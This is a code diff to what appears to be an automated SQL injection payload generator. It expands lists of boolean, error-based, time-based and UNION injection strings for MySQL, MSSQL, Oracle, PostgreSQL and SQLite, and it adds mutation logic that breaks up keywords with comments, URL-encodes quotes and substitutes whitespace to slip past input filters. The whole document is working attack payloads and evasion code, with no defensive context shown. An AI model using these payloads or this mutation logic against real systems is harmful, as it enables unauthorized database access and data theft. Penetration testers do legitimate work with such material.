@@ -9,15 +9,13 @@ PAYLOAD_TEMPLATES = {
         "1'", "1\"", "1')",
     ],
     "boolean_true": [
-        "' OR 1=1 -- ", "' OR 1=1 #", "' OR 'a'='a' -- ",
-        "admin' OR '1'='1' -- ", "\" OR 1=1 -- ",
-        "' AND 1=1 -- ", "' AND 1=1 #", "admin' -- ",
+        "' OR 1=1 -- ", "' OR 'a'='a' -- ", "admin' OR '1'='1' -- ",
+        "\" OR 1=1 -- ", "' AND 1=1 -- ", "admin' -- ",
         "' UNION SELECT 1,1,1 WHERE 1=1 -- ",
-        "' OR 1=1-- ", "' OR 1=1 /* */",
+        "1 OR 1=1 -- ", "1) OR (1=1 -- ", "' OR 2>1 -- ", "' OR TRUE -- ",
     ],
     "boolean_false": [
-        "' OR 1=2 -- ", "' AND 1=2 -- ",
-        "' OR 'a'='b' -- ", "' OR 1=0 -- ",
+        "' OR 1=2 -- ", "' AND 1=2 -- ", "1 OR 1=2 -- ", "1) OR (1=2 -- ",
     ],
     "error_based": [
         "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT VERSION()), 0x7e)) -- ",
@@ -25,7 +23,8 @@ PAYLOAD_TEMPLATES = {
         "1' AND 1=CONVERT(INT, (SELECT @@VERSION)) -- ",
         "1' OR 1/@@VERSION -- ",
         "' OR CAST((SELECT VERSION()) AS NUMERIC) -- ",
-        "' AND (SELECT dbms_pipe.receive_message(('a'),10) FROM dual) -- ",
+        "' AND 1=CAST((SELECT sqlite_version()) AS INT) -- ",
+        "' AND load_extension('nonexistent') -- ",
     ],
     "time_based": [
         "' OR SLEEP(5) -- ", "' AND SLEEP(5) -- ",
@@ -35,6 +34,9 @@ PAYLOAD_TEMPLATES = {
         "1' OR WAITFOR DELAY '0:0:5' -- ",
         "1' AND BENCHMARK(5000000,MD5('test')) -- ",
         "1' OR (SELECT dbms_lock.sleep(5) FROM dual) -- ",
+        "' AND (SELECT dbms_pipe.receive_message(('a'),10) FROM dual) -- ",
+        "1' AND LIKE('ABCDEFG', UPPER(HEX(RANDOMBLOB(500000000/2)))) -- ",
+        "1' OR LIKE('ABCDEFG', UPPER(HEX(RANDOMBLOB(500000000/2)))) -- ",
     ],
     "union_probe": [
         "' UNION SELECT NULL -- ",
@@ -64,10 +66,15 @@ WHITESPACE = ["%09", "%0a", "%0d", "\t", "  "]
 def mutate_payload(payload: str, complexity: int = 2) -> str:
     result = payload
     if complexity >= 1:
-        keywords = ["SELECT", "UNION", "OR", "AND", "SLEEP", "WHERE", "FROM"]
+        keywords = [
+            "SELECT", "UNION", "OR", "AND", "WHERE", "FROM",
+            "SLEEP", "BENCHMARK", "EXTRACTVALUE", "UPDATEXML",
+            "CONVERT", "WAITFOR", "DELAY", "PG_SLEEP",
+            "DBMS_LOCK", "DBMS_PIPE"
+        ]
         for kw in keywords:
             idx = result.upper().find(kw.upper())
-            if idx >= 0 and len(kw) > 2:
+            if idx >= 0 and len(kw) >= 2:
                 pos = idx + random.randint(1, len(kw) - 1)
                 result = result[:pos] + random.choice(COMMENT_CHUNKS) + result[pos:]
                 if random.random() < 0.3:
@@ -80,6 +87,9 @@ def mutate_payload(payload: str, complexity: int = 2) -> str:
         result = "".join(chars)
     if complexity >= 1 and random.random() < 0.4:
         result = result.replace("'", random.choice(["%27", "%2527", "\'"]))
+    if complexity >= 1 and random.random() < 0.4:
+        if " " in result:
+            result = result.replace(" ", random.choice(WHITESPACE), 1)
     return result
 
 def generate_payloads() -> list:
